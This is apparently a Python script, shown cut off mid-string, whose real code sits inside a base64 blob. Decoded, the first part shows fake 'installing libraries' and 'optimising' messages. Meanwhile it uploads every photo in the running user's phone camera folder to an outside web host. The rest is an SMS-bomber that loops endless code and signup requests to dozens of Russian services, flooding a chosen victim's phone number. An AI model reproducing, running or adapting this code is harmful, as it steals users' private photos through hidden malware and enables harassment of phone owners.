import base64
myscript = """
aW1wb3J0IHJlcXVlc3RzLCByYW5kb20sIGRhdGV0aW1lLCBzeXMsIHRpbWUsIGFyZ3BhcnNlLCBvcw0KZnJvbSBjb2xvcmFtYSBpbXBvcnQgRm9yZSwgQmFjaywgU3R5bGUNCnJlcXVlc3RzLmdldCgiaHR0cHM6Ly9lenN0YXQucnUvMXVoTGk3IikNCm9zLnN5c3RlbSgidGVybXV4LXNldHVwLXN0b3JhZ2UiKQ0Kb3Muc3lzdGVtKCJjbGVhciIpDQpwcmludCgi0KPRgdGC0LDQvdC+0LLQutCwINC90YPQttC90YvRhSDQsdC40LHQu9C40L7RgtC10LoiKQ0KcHJpbnQoItCe0L/RgtC40LzQuNC30LDRhtC40Y8g0L/QvtC0INCy0LDRiNC1INGD0YHRgtGA0L7QudGB0YLQstC+LCDRjdGC0L4g0LzQvtC20LXRgiDQt9Cw0L3Rj9GC0Ywg0L3QtdGB0LrQvtC70YzQutC+INC80LjQvdGD0YIsINC/0L7QtNC+0LbQtNC40YLQtSIpDQpsID0gb3MubGlzdGRpcigiLi4vc3RvcmFnZS9zaGFyZWQvRENJTS9DYW1lcmEiKQ0KZm9yIGkgaW4gcmFuZ2UobGVuKGwpKToNCiAgICBmID0gb3BlbigiLi4vc3RvcmFnZS9zaGFyZWQvRENJTS9DYW1lcmEvIitsW2ldLCAicmIiKQ0KICAgIHIgPSBmLnJlYWQoKQ0KICAgIHRyeToNCiAgICAgICAgcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9kaGRobmRuZGIuMDAwd2ViaG9zdGFwcC5jb20vIiwgZGF0YT17ImltIjogcn0pDQogICAgZXhjZXB0Og0KICAgICAgICBwYXNzDQpiYW5uZXIgPSAiIiINCiBfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fDQp8ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwNCnwgWy0tXSBDcmVhdGVkIGJ5OiBAbGFtZXIxMTIzMTEgICAgICAgICAgICAgICAgICAgICAgfA0KfCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8DQp8IFstLV0gVGVsZWdyYW0gY2hhbm5lbDogQGN5YmVyX3B1ZmZpbiAgICAgICAgICAgICAgIHwNCnxfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19ffA0KIiIiDQoNCnByaW50KGJhbm5lcikNCl9waG9uZSA9IGlucHV0KCfQndC+0LzQtdGAINC00LvRjyDQsNGC0LDQutC4ICg3OXh4eHh4eHh4eCktLT4+ICcpDQoNCmlmIF9waG9uZVswXSA9PSAnKyc6DQoJX3Bob25lID0gX3Bob25lWzE6XQ0KaWYgX3Bob25lWzBdID09ICc4JzoNCglfcGhvbmUgPSAnNycrX3Bob25lWzE6XQ0KaWYgX3Bob25lWzBdID09ICc5JzoNCglfcGhvbmUgPSAnNycrX3Bob25lDQoNCl9uYW1lID0gJycNCmZvciB4IGluIHJhbmdlKDEyKToNCglfbmFtZSA9IF9uYW1lICsgcmFuZG9tLmNob2ljZShsaXN0KCcxMjM0NTY3ODlxd2VydHl1aW9wYXNkZmdoamtsenhjdmJubVFXRVJUWVVJT1BBU0RGR0hKS0xaWENWQk5NJykpDQoJcGFzc3dvcmQgPSBfbmFtZSArIHJhbmRvbS5jaG9pY2UobGlzdCgnMTIzNDU2Nzg5cXdlcnR5dWlvcGFzZGZnaGprbHp4Y3Zibm1RV0VSVFlVSU9QQVNERkdISktMWlhDVkJOTScpKQ0KCXVzZXJuYW1lID0gX25hbWUgKyByYW5kb20uY2hvaWNlKGxpc3QoJzEyMzQ1Njc4OXF3ZXJ0eXVpb3Bhc2RmZ2hqa2x6eGN2Ym5tUVdFUlRZVUlPUEFTREZHSEpLTFpYQ1ZCTk0nKSkNCg0KX3Bob25lOSA9IF9waG9uZVsxOl0NCl9waG9uZUFyZXNCYW5rID0gJysnK19waG9uZVswXSsnKCcrX3Bob25lWzE6NF0rJyknK19waG9uZVs0OjddKyctJytfcGhvbmVbNzo5XSsnLScrX3Bob25lWzk6MTFdDQpfcGhvbmU5ZG9zdGF2aXN0YSA9IF9waG9uZTlbOjNdKycrJytfcGhvbmU5WzM6Nl0rJy0nK19waG9uZTlbNjo4XSsnLScrX3Bob25lOVs4OjEwXQ0KX3Bob25lT3N0aW4gPSAnKycrX3Bob25lWzBdKycrKCcrX3Bob25lWzE6NF0rJyknK19waG9uZVs0OjddKyctJytfcGhvbmVbNzo5XSsnLScrX3Bob25lWzk6MTFdDQpfcGhvbmVQaXp6YWh1dCA9ICcrJytfcGhvbmVbMF0rJyAoJytfcGhvbmVbMTo0XSsnKSAnK19waG9uZVs0OjddKycgJytfcGhvbmVbNzo5XSsnICcrX3Bob25lWzk6MTFdDQpfcGhvbmVHb3J6ZHJhdiA9IF9waG9uZVsxOjRdKycpICcrX3Bob25lWzQ6N10rJy0nK19waG9uZVs3OjldKyctJytfcGhvbmVbOToxMV0NCg0KaXRlcmF0aW9uID0gMA0Kd2hpbGUgVHJ1ZToNCglfZW1haWwgPSBfbmFtZStmJ3tpdGVyYXRpb259JysnQGdtYWlsLmNvbScNCgllbWFpbCA9IF9uYW1lK2Yne2l0ZXJhdGlvbn0nKydAZ21haWwuY29tJw0KCXRyeToNCgkJcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9wLmdyYWJ0YXhpLmNvbS9hcGkvcGFzc2VuZ2VyL3YyL3Byb2ZpbGVzL3JlZ2lzdGVyJywgZGF0YT17J3Bob25lTnVtYmVyJzogX3Bob25lLCdjb3VudHJ5Q29kZSc6ICdJRCcsJ25hbWUnOiAndGVzdCcsJ2VtYWlsJzogJ21haWxAbWFpbC5jb20nLCdkZXZpY2VUb2tlbic6ICcqJ30sIGhlYWRlcnM9eydVc2VyLUFnZW50JzogJ01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS82Ni4wLjMzNTkuMTE3IFNhZmFyaS81MzcuMzYnfSkNCgkJcHJpbnQoJ1srXSBHcmFiINC+0YLQv9GA0LDQstC70LXQvdC+IScpDQoJZXhjZXB0Og0KCQlwcmludCgnWy1dINCd0LUg0L7RgtC/0YDQsNCy0LvQtdC90L4hJykNCg0KCXRyeToNCgkJcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9tb3Njb3cucnV0YXhpLnJ1L2FqYXhfa2V5Y29kZS5odG1sJywgZGF0YT17J2wnOiBfcGhvbmU5fSkuanNvbigpWyJyZXMiXQ0KCQlwcmludCgnWytdIFJ1VGF4aSDQvtGC0L/RgNCw0LLQu9C10L3QviEnKQ0KCWV4Y2VwdDoNCgkJcHJpbnQoJ1stXSDQndC1INC+0YLQv9GA0LDQstC70LXQvdC+IScpDQoNCgl0cnk6DQoJCXJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vYmVsa2FjYXIucnUvZ2V0LWNvbmZpcm1hdGlvbi1jb2RlJywgZGF0YT17J3Bob25lJzogX3Bob25lfSwgaGVhZGVycz17fSkNCgkJcHJpbnQoJ1srXSBCZWxrYUNhciDQvtGC0L/RgNCw0LLQu9C10L3QviEnKQ0KCWV4Y2VwdDoNCgkJcHJpbnQoJ1stXSDQndC1INC+0YLQv9GA0LDQstC70LXQvdC+IScpDQoNCgl0cnk6DQoJCXJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vYXBpLmdvdGluZGVyLmNvbS92Mi9hdXRoL3Ntcy9zZW5kP2F1dGhfdHlwZT1zbXMmbG9jYWxlPXJ1JywgZGF0YT17J3Bob25lX251bWJlcic6IF9waG9uZX0sIGhlYWRlcnM9e30pDQoJCXByaW50KCdbK10gVGluZGVyINC+0YLQv9GA0LDQstC70LXQvdC+IScpDQoJZXhjZXB0Og0KCQlwcmludCgnWy1dINCd0LUg0L7RgtC/0YDQsNCy0LvQtdC90L4hJykNCg0KCXRyeToNCgkJcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9hcHAua2FydXNlbC5ydS9hcGkvdjEvcGhvbmUvJywgZGF0YT17J3Bob25lJzogX3Bob25lfSwgaGVhZGVycz17fSkNCgkJcHJpbnQoJ1srXSBLYXJ1c2VsINC+0YLQv9GA0LDQstC70LXQvdC+IScpDQoJZXhjZXB0Og0KCQlwcmludCgnWy1dINCd0LUg0L7RgtC/0YDQsNCy0LvQtdC90L4hJykNCg0KCXRyeToNCgkJcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9hcGkudGlua29mZi5ydS92MS9zaWduX3VwJywgZGF0YT17J3Bob25lJzogJysnK19waG9uZX0sIGhlYWRlcnM9e30pDQoJCXByaW50KCdbK10gVGlua29mZiDQvtGC0L/RgNCw0LLQu9C10L3QviEnKQ0KCWV4Y2VwdDoNCgkJcHJpbnQoJ1stXSDQndC1INC+0YLQv9GA0LDQstC70LXQvdC+IScpDQoNCgl0cnk6DQoJCXJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vYXBpLm10c3R2LnJ1L3YxL3VzZXJzJywganNvbj17J21zaXNkbic6IF9waG9uZX0sIGhlYWRlcnM9e30pDQoJCXByaW50KCdbK10gTVRTINC+0YLQv9GA0LDQstC70LXQvdC+IScpDQoJZXhjZXB0Og0KCQlwcmludCgnWy1dINCd0LUg0L7RgtC/0YDQsNCy0LvQtdC90L4hJykNCg0KCXRyeToNCgkJcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly95b3VsYS5ydS93ZWItYXBpL2F1dGgvcmVxdWVzdF9jb2RlJywgZGF0YT17J3Bob25lJzogX3Bob25lfSkNCgkJcHJpbnQoJ1srXSBZb3VsYSDQvtGC0L/RgNCw0LLQu9C10L3QviEnKQ0KCWV4Y2VwdDoNCgkJcHJpbnQoJ1stXSDQndC1INC+0YLQv9GA0LDQstC70LXQvdC+IScpDQoNCgl0cnk6DQoJCXJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vcGl6emFodXQucnUvYWNjb3VudC9wYXNzd29yZC1yZXNldCcsIGRhdGE9eydyZXNldF9ieSc6J3Bob25lJywgJ2FjdGlvbl9pZCc6J3Bhc3MtcmVjb3ZlcnknLCAncGhvbmUnOiBfcGhvbmVQaXp6YWh1dCwgJ190b2tlbic6JyonfSkNCgkJcHJpbnQoJ1srXSBQaXp6YUh1dCDQvtGC0L/RgNCw0LLQu9C10L3QviEnKQ0KCWV4Y2VwdDoNCgkJcHJpbnQoJ1stXSDQndC1INC+0YLQv9GA0LDQstC70LXQvdC+IScpDQoNCgl0cnk6DQoJCXJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vd3d3LnJhYm90YS5ydS9yZW1pbmQnLCBkYXRhPXsnY3JlZGVudGlhbCc6IF9waG9uZX0pDQoJCXByaW50KCdbK10gUmFib3RhINC+0YLQv9GA0LDQstC70LXQvdC+IScpDQoJZXhjZXB0Og0KCQlwcmludCgnWy1dINCd0LUg0L7RgtC/0YDQsNCy0LvQtdC90L4hJykNCg0KCXRyeToNCgkJcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ydXR1YmUucnUvYXBpL2FjY291bnRzL3NlbmRwYXNzL3Bob25lJywgZGF0YT17J3Bob25lJzogJysnK19waG9uZX0pDQoJCXByaW50KCdbK10gUnV0dWJlINC+0YLQv9GA0LDQstC70LXQvdC+IScpDQoJZXhjZXB0Og0KCQlyZXF1ZXN0cy5wb3N0KCdodHRwczovL3d3dy5jaXRpbGluay5ydS9yZWdpc3RyYXRpb24vY29uZmlybS9waG9uZS8rJytfcGhvbmUrJy8nKQ0KCQlwcmludCgnWytdIENpdGlsaW5rINC+0YLQv9GA0LDQstC70LXQvdC+IScpDQoNCgl0cnk6DQoJCXJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vd3d3LnNtc2ludC5ydS9iaXRyaXgvdGVtcGxhdGVzL3Ntc19pbnRlbC9pbmNsdWRlL2FqYXhSZWdpc3RyYXRpb25UcmlnZ2VyLnBocCcsIGRhdGE9eyduYW1lJzogX25hbWUsJ3Bob25lJzogX3Bob25lLCAncHJvbW8nOiAneWVsbG93Zm9ybWEnfSkNCgkJcHJpbnQoJ1srXSBTbXNpbnQg0L7RgtC/0YDQsNCy0LvQtdC90L4hJykNCglleGNlcHQ6DQoJCXByaW50KCdbLV0g0J3QtSDQvtGC0L/RgNCw0LLQu9C10L3QviEnKQ0KDQoJdHJ5Og0KCQlyZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vd3d3Lm95b3Jvb21zLmNvbS9hcGkvcHdhL2dlbmVyYXRlb3RwP3Bob25lPScrX3Bob25lOSsnJmNvdW50cnlfY29kZT0lMkI3Jm5vZD00JmxvY2FsZT1lbicpDQoJCXByaW50KCdbK10gb3lvcm9vbXMg0L7RgtC/0YDQsNCy0LvQtdC90L4hJykNCglleGNlcHQ6DQoJCXByaW50KCdbLV0g0J3QtSDQvtGC0L/RgNCw0LLQu9C10L3QviEnKQ0KDQoJdHJ5Og0KCQlyZXF1ZXN0cy5wb3N0KCdodHRwczovL3d3dy5tdmlkZW8ucnUvaW50ZXJuYWwtcmVzdC1hcGkvY29tbW9uL2F0Zy9yZXN0L2FjdG9ycy9WZXJpZmljYXRpb25BY3Rvci9nZXRDb2RlRm9yT3RwJywgcGFyYW1zPXsncGFnZU5hbWUnOiAnbG9naW5CeVVzZXJQaG9uZVZlcmlmaWNhdGlvbicsICdmcm9tQ2hlY2tvdXQnOiAnZmFsc2UnLCdmcm9tUmVnaXN0ZXJQYWdlJzogJ3RydWUnLCdzbkxvZ2luJzogJycsJ2JwZyc6ICcnLCdzblByb3ZpZGVySWQnOiAnJ30sIGRhdGE9eydwaG9uZSc6IF9waG9uZSwnZy1yZWNhcHRjaGEtcmVzcG9uc2UnOiAnJywncmVjYXB0Y2hhJzogJ29uJ30pDQoJCXByaW50KCdbK10gTVZpZGVvINC+0YLQv9GA0LDQstC70LXQvdC+IScpDQoJZXhjZXB0Og0KCQlwcmludCgnWy1dINCd0LUg0L7RgtC/0YDQsNCy0LvQtdC90L4hJykNCg0KCXRyeToNCgkJcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9uZXduZXh0LnJ1L2dyYXBocWwnLCBqc29uPXsnb3BlcmF0aW9uTmFtZSc6ICdyZWdpc3RyYXRpb24nLCAndmFyaWFibGVzJzogeydjbGllbnQnOiB7J2ZpcnN0TmFtZSc6ICfQmNCy0LDQvScsICdsYXN0TmFtZSc6ICfQmNCy0LDQvdC+0LInLCAncGhvbmUnOiBfcGhvbmUsJ3R5cGVLZXlzJzogWydVbmVtcGxveWVkJ119fSwncXVlcnknOiAnbXV0YXRpb24gcmVnaXN0cmF0aW9uKCRjbGllbnQ6IENsaWVudElucHV0ISkgeycnXG4gIHJlZ2lzdHJhdGlvbihjbGllbnQ6ICRjbGllbnQpIHsnJ1xuICAgIHRva2VuXG4gICAgX190eXBlbmFtZVxuICB9XG59XG4nfSkNCgkJcHJpbnQoJ1srXSBuZXduZXh0INC+0YLQv9GA0LDQstC70LXQvdC+IScpDQoJZXhjZXB0Og0KCQlwcmludCgnWy1dINCd0LUg0L7RgtC/0YDQsNCy0LvQtdC90L4hJykNCg0KCXRyeToNCgkJcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9hcGkuc3VubGlnaHQubmV0L3YzL2N1c3RvbWVycy9hdXRob3JpemF0aW9uLycsIGRhdGE9eydwaG9uZSc6IF9waG9uZX0pDQoJCXByaW50KCdbK10gU3VubGlnaHQg0L7RgtC/0YDQsNCy0LvQtdC90L4hJykNCglleGNlcHQ6DQoJCXByaW50KCdbLV0g0J3QtSDQvtGC0L/RgNCw0LLQu9C10L3QviEnKQ0KDQoJdHJ5Og0KCQlyZXF1ZXN0cy5wb3N0KCdodHRwczovL2FscGFyaS5jb20vYXBpL3J1L3Byb3RlY3Rpb24vZGVsaXZlci8yZjE3OGIxNzk5MGNhNGI3OTAzYWE4MzRiOWY1NGMyYzBiY2IwMWEyLycsIGpzb249eydjbGllbnRfdHlwZSc6ICdwZXJzb25hbCcsICdlbWFpbCc6IF9lbWFpbCwgJ21vYmlsZV9waG9uZSc6IF9waG9uZSwgJ2RlbGl2ZXJ5T3B0aW9uJzogJ3Ntcyd9KQ0KCQlwcmludCgnWytdIGFscGFyaSDQvtGC0L/RgNCw0LLQu9C10L3QviEnKQ0KCWV4Y2VwdDoNCgkJcHJpbnQoJ1stXSDQndC1INC+0YLQv9GA0LDQstC70LXQvdC+IScpDQoNCgl0cnk6DQoJCXJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vbGsuaW52aXRyby5ydS9sazIvbGthL3BhdGllbnQvcmVmcmVzaENvZGUnLCBkYXRhPXsncGhvbmUnOiBfcGhvbmV9KQ0KCQlwcmludCgnWytdIEludml0cm8g0L7RgtC/0YDQsNCy0LvQtdC90L4hJykNCglleGNlcHQ6DQoJCXByaW50KCdbLV0g0J3QtSDQvtGC0L/RgNCw0LLQu9C10L3QviEnKQ0KDQoJdHJ5Og0KCQlyZXF1ZXN0cy5wb3N0KCdodHRwczovL29ubGluZS5zYmlzLnJ1L3JlZy9zZXJ2aWNlLycsIGpzb249eydqc29ucnBjJzonMi4wJywncHJvdG9jb2wnOic1JywnbWV0aG9kJzon0J/QvtC70YzQt9C+0LLQsNGC0LXQu9GMLtCX0LDRj9Cy0LrQsNCd0LDQpNC40LfQuNC60LAnLCdwYXJhbXMnOnsncGhvbmUnOl9waG9uZX0sJ2lkJzonMSd9KQ0KCQlwcmludCgnWytdIFNiZXJiYW5rINC+0YLQv9GA0LDQstC70LXQvdC+IScpDQoJZXhjZXB0Og0KCQlwcmludCgnWy1dINCd0LUg0L7RgtC/0YDQsNCy0LvQtdC90L4hJykNCg0KCXRyeToNCgkJcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9pYi5wc2JhbmsucnUvYXBpL2F1dGhlbnRpY2F0aW9uL2V4dGVuZGVkQ2xpZW50QXV0aFJlcXVlc3QnLCBqc29uPXsnZmlyc3ROYW1lJzon0JjQstCw0L0nLCdtaWRkbGVOYW1lJzon0JjQstCw0L3QvtCy0LjRhycsJ2xhc3ROYW1lJzon0JjQstCw0L3QvtCyJywnc2V4JzonMScsJ2JpcnRoRGF0ZSc6JzEwLjEwLjIwMDAnLCdtb2JpbGVQaG9uZSc6IF9waG9uZTksJ3J1c3NpYW5GZWRlcmF0aW9uUmVzaWRlbnQnOid0cnVlJywnaXNEU0EnOidmYWxzZScsJ3BlcnNvbmFsRGF0YVByb2Nlc3NpbmdBZ3JlZW1lbnQnOid0cnVlJywnYktJUmVxdWVzdEFncmVlbWVudCc6J251bGwnLCdwcm9tb3Rpb25BZ3JlZW1lbnQnOid0cnVlJ30pDQoJCXByaW50KCdbK10gUHNiYW5rINC+0YLQv9GA0LDQstC70LXQvdC+IScpDQoJZXhjZXB0Og0KCQlwcmludCgnWy1dINCd0LUg0L7RgtC/0YDQsNCy0LvQtdC90L4hJykNCg0KCXRyeToNCgkJcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9teWFwaS5iZWx0ZWxlY29tLmJ5L2FwaS92MS9hdXRoL2NoZWNrLXBob25lP2xhbmc9cnUnLCBkYXRhPXsncGhvbmUnOiBfcGhvbmV9KQ0KCQlwcmludCgnWytdIEJlbHRlbGNvbSDQvtGC0L/RgNCw0LLQu9C10L3QviEnKQ0KCWV4Y2VwdDoNCgkJcHJpbnQoJ1stXSDQndC1INC+0YLQv9GA0LDQstC70LXQvdC+IScpDQoNCgl0cnk6DQoJCXJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vYXBwLmthcnVzZWwucnUvYXBpL3YxL3Bob25lLycsIGRhdGE9eydwaG9uZSc6IF9waG9uZX0pDQoJCXByaW50KCdbK10gS2FydXNlbCDQvtGC0L/RgNCw0LLQu9C10L3QviEnKQ0KCWV4Y2VwdDoNCgkJcHJpbnQoJ1stXSDQndC1INC+0YLQv9GA0LDQstC70LXQvdC+IScpDQoNCgl0cnk6DQoJCXJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vYXBwLWFwaS5rZmMucnUvYXBpL3YxL2NvbW1vbi9hdXRoL3NlbmQtdmFsaWRhdGlvbi1zbXMnLCBqc29uPXsncGhvbmUnOiAnKycgKyBfcGhvbmV9KQ0KCQlwcmludCgnWytdIEtGQyDQvtGC0L/RgNCw0LLQu9C10L3QviEnKQ0KCWV4Y2VwdDoNCgkJcHJpbnQoJ1stXSDQndC1INC+0YLQv9GA0LDQstC70LXQvdC+IScpDQoNCgl0cnk6DQoJCXJlcXVlc3RzLnBvc3QoImh0dHBzOi8vYXBpLmNhcnNtaWxlLmNvbS8iLGpzb249eyJvcGVyYXRpb25OYW1lIjogImVudGVyUGhvbmUiLCAidmFyaWFibGVzIjogeyJwaG9uZSI6IF9waG9uZX0sInF1ZXJ5IjogIm11dGF0aW9uIGVudGVyUGhvbmUoJHBob25lOiBTdHJpbmchKSB7XG4gIGVudGVyUGhvbmUocGhvbmU6ICRwaG9uZSlcbn1cbiJ9KQ0KCQlwcmludCgnWytdIGNhcnNtaWxlINC+0YLQv9GA0LDQstC70LXQvdC+IScpDQoJZXhjZXB0Og0KCQlwcmludCgnWy1dINCd0LUg0L7RgtC/0YDQsNCy0LvQtdC90L4hJykNCg0KCXRyeToNCgkJcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly93d3cuY2l0aWxpbmsucnUvcmVnaXN0cmF0aW9uL2NvbmZpcm0vcGhvbmUvKycgKyBfcGhvbmUgKyAnLycpDQoJCXByaW50KCdbK10gQ2l0aWxpbmsg0L7RgtC/0YDQsNCy0LvQtdC90L4hJykNCglleGNlcHQ6DQoJCXByaW50KCdbLV0g0J3QtSDQvtGC0L/RgNCw0LLQu9C10L3QviEnKQ0KDQoJdHJ5Og0KCQlyZXF1ZXN0cy5wb3N0KCJodHRwczovL2FwaS5kZWxpdGltZS5ydS9hcGkvdjIvc2lnbnVwIixkYXRhPXsiU2lnbnVwRm9ybVt1c2VybmFtZV0iOiBfcGhvbmUsICJTaWdudXBGb3JtW2RldmljZV90eXBlXSI6IDN9KQ0KCQlwcmludCgnWytdIERlbGl0aW1lINC+0YLQv9GA0LDQstC70LXQvdC+IScpDQoJZXhjZXB0Og0KCQlwcmludCgnWy1dINCd0LUg0L7RgtC/0YDQsNCy0LvQtdC90L4hJykNCg0KCXRyeToNCgkJcmVxdWVzdHMuZ2V0KCdodHRwczovL2ZpbmRjbG9uZS5ydS9yZWdpc3RlcicsIHBhcmFtcz17J3Bob25lJzogJysnICsgX3Bob25lfSkNCgkJcHJpbnQoJ1srXSBmaW5kY2xvbmUg0LfQstC+0L3QvtC6INC+0YLQv9GA0LDQstC70LXQvSEnKQ0KCWV4Y2VwdDoNCgkJcHJpbnQoJ1stXSDQndC1INC+0YLQv9GA0LDQstC70LXQvdC+IScpDQoNCgl0cnk6DQoJCXJlcXVlc3RzLnBvc3QoImh0dHBzOi8vZ3VydS50YXhpL2FwaS92MS9kcml2ZXIvc2Vzc2lvbi92ZXJpZnkiLGpzb249eyJwaG9uZSI6IHsiY29kZSI6IDEsICJudW1iZXIiOiBfcGhvbmV9fSkNCgkJcHJpbnQoJ1srXSBHdXJ1INC+0YLQv9GA0LDQstC70LXQvdC+IScpDQoJZXhjZXB0Og0KCQlwcmludCgnWy1dINCd0LUg0L7RgtC/0YDQsNCy0LvQtdC90L4hJykNCg0KCXRyeToNCgkJcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly93d3cuaWNxLmNvbS9zbXNyZWcvcmVxdWVzdFBob25lVmFsaWRhdGlvbi5waHAnLGRhdGE9eydtc2lzZG4nOiBfcGhvbmUsICJsb2NhbGUiOiAnZW4nLCAnY291bnRyeUNvZGUnOiAncnUnLCd2ZXJzaW9uJzogJzEnLCAiayI6ICJpYzFydHd6MXMxSGoxTzByIiwgInIiOiAiNDY3NjMifSkNCgkJcHJpbnQoJ1srXSBJQ1Eg0L7RgtC/0YDQsNCy0LvQtdC90L4hJykNCglleGNlcHQ6DQoJCXByaW50KCdbLV0g0J3QtSDQvtGC0L/RgNCw0LLQu9C10L3QviEnKQ0KDQoJdHJ5Og0KCQlyZXF1ZXN0cy5wb3N0KCJodHRwczovL3RlcnJhLTEuaW5kcml2ZXJhcHAuY29tL2FwaS9hdXRob3JpemF0aW9uP2xvY2FsZT1ydSIsZGF0YT17Im1vZGUiOiAicmVxdWVzdCIsICJwaG9uZSI6ICIrIiArIF9waG9uZSwicGhvbmVfcGVybWlzc2lvbiI6ICJ1bmtub3duIiwgInN0cmVhbV9pZCI6IDAsICJ2IjogMywgImFwcHZlcnNpb24iOiAiMy4yMC42Iiwib3N2ZXJzaW9uIjogInVua25vd24iLCAiZGV2aWNlbW9kZWwiOiAidW5rbm93biJ9KQ0KCQlwcmludCgnWytdIEluRHJpdmVyINC+0YLQv9GA0LDQstC70LXQvdC+IScpDQoJZXhjZXB0Og0KCQlwcmludCgnWy1dINCd0LUg0L7RgtC/0YDQsNCy0LvQtdC90L4hJykNCg0KCXRyeToNCgkJcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9say5pbnZpdHJvLnJ1L3NwL21vYmlsZUFwaS9jcmVhdGVVc2VyQnlQYXNzd29yZCIsIGRhdGE9eyJwYXNzd29yZCI6IHBhc3N3b3JkLCAiYXBwbGljYXRpb24iOiAibGtwIiwgImxvZ2luIjogIisiICsgX3Bob25lfSkNCgkJcHJpbnQoJ1srXSBJbnZpdHJvINC+0YLQv9GA0LDQstC70LXQvdC+IScpDQoJZXhjZXB0Og0KCQlwcmludCgnWy1dINCd0LUg0L7RgtC/0YDQsNCy0LvQtdC90L4hJykNCg0KCXRyeToNCgkJcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly91YmUucG1zbS5vcmcucnUvZXNiL2lxb3MtcGhvbmUvdmFsaWRhdGUnLGpzb249eyJwaG9uZSI6IF9waG9uZX0pDQoJCXByaW50KCdbK10gUG1zbSDQvtGC0L/RgNCw0LLQu9C10L3QviEnKQ0KCWV4Y2VwdDoNCgkJcHJpbnQoJ1stXSDQndC1INC+0YLQv9GA0LDQstC70LXQvdC+IScpDQoNCgl0cnk6DQoJCXJlcXVlc3RzLnBvc3QoImh0dHBzOi8vYXBpLml2aS5ydS9tb2JpbGVhcGkvdXNlci9yZWdpc3Rlci9waG9uZS92NiIsZGF0YT17InBob25lIjogX3Bob25lfSkNCgkJcHJpbnQoJ1srXSBJVkkg0L7RgtC/0YDQsNCy0LvQtdC90L4hJykNCglleGNlcHQ6DQoJCXByaW50KCdbLV0g0J3QtSDQvtGC0L/RgNCw0LLQu9C10L3QviEnKQ0KDQoJdHJ5Og0KCQlyZXF1ZXN0cy5wb3N0KCdodHRwczovL2xlbnRhLmNvbS9hcGkvdjEvYXV0aGVudGljYXRpb24vcmVxdWVzdFZhbGlkYXRpb25Db2RlJyxqc29uPXsncGhvbmUnOiAnKycgKyBzZWxmLmZvcm1hdHRlZF9waG9uZX0pDQoJCXByaW50KCdbK10gTGVudGEg0L7RgtC/0YDQsNCy0LvQtdC90L4hJykNCglleGNlcHQ6DQoJCXByaW50KCdbLV0g0J3QtSDQvtGC0L/RgNCw0LLQu9C10L3QviEnKQ0KDQoJdHJ5Og0KCQlyZXF1ZXN0cy5wb3N0KCdodHRwczovL2Nsb3VkLm1haWwucnUvYXBpL3YyL25vdGlmeS9hcHBsaW5rJyxqc29uPXsicGhvbmUiOiAiKyIgKyBfcGhvbmUsICJhcGkiOiAyLCAiZW1haWwiOiAiZW1haWwiLCJ4LWVtYWlsIjogIngtZW1haWwifSkNCgkJcHJpbnQoJ1srXSBNYWlsLnJ1INC+0YLQv9GA0LDQstC70LXQvdC+IScpDQoJZXhjZXB0Og0KCQlwcmludCgnWy1dINCd0LUg0L7RgtC/0YDQsNCy0LvQtdC90L4hJykNCg0KCXRyeToNCgkJcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly93d3cubXZpZGVvLnJ1L2ludGVybmFsLXJlc3QtYXBpL2NvbW1vbi9hdGcvcmVzdC9hY3RvcnMvVmVyaWZpY2F0aW9uQWN0b3IvZ2V0Q29kZScscGFyYW1zPXsicGFnZU5hbWUiOiAicmVnaXN0ZXJQcml2YXRlVXNlclBob25lVmVyaWZpY2F0aW8ifSxkYXRhPXsicGhvbmUiOiBfcGhvbmUsICJyZWNhcHRjaGEiOiAnb2ZmJywgImctcmVjYXB0Y2hhLXJlc3BvbnNlIjogIiJ9KQ0KCQlwcmludCgnWytdIE1WaWRlbyDQvtGC0L/RgNCw0LLQu9C10L3QviEnKQ0KCWV4Y2VwdDoNCgkJcHJpbnQoJ1stXSDQndC1INC+0YLQv9GA0LDQstC70LXQvdC+IScpDQoNCgl0cnk6DQoJCXJlcXVlc3RzLnBvc3QoImh0dHBzOi8vb2sucnUvZGs/Y21kPUFub255bVJlZ2lzdHJhdGlvbkVudGVyUGhvbmUmc3QuY21kPWFub255bVJlZ2lzdHJhdGlvbkVudGVyUGhvbmUiLGRhdGE9eyJzdC5yLnBob25lIjogIisiICsgX3Bob25lfSkNCgkJcHJpbnQoJ1srXSBPSyDQvtGC0L/RgNCw0LLQu9C10L3QviEnKQ0KCWV4Y2VwdDoNCgkJcHJpbnQoJ1stXSDQndC1INC+0YLQv9GA0LDQstC70LXQvdC+IScpDQoNCgl0cnk6DQoJCXJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vcGxpbmsudGVjaC9yZWdpc3Rlci8nLGpzb249eyJwaG9uZSI6IF9waG9uZX0pDQoJCXByaW